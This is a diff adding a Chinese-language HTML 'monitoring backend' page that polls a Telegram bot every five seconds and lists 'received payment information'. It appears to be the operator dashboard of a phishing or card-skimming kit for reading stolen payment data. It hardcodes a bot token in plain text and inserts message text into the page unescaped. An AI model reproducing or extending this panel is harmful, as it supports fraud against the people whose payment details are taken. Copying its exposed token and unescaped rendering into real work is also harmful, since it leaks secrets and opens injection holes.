@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+<head><title>监控后台</title></head>
+<body style="background:#222; color:#0f0; padding:20px; font-family:monospace;">
+    <h2>实时收到的支付信息 (5秒更新)</h2>
+    <div id="list"></div>
+    <script>
+        const token = '8583936218:AAHCfYB1NpUCHrltmKescnDCy1fHdhyOq28';
+        async function load() {
+            const r = await fetch(`https://api.telegram.org/bot${token}/getUpdates`);
+            const d = await r.json();
+            document.getElementById('list').innerHTML = d.result.reverse()
+                .map(m => `<div style="border-bottom:1px solid #444; margin-bottom:10px;">${m.message.text}</div>`).join('');
+        }
+        setInterval(load, 5000); load();
+    </script>
+</body>
+</html>
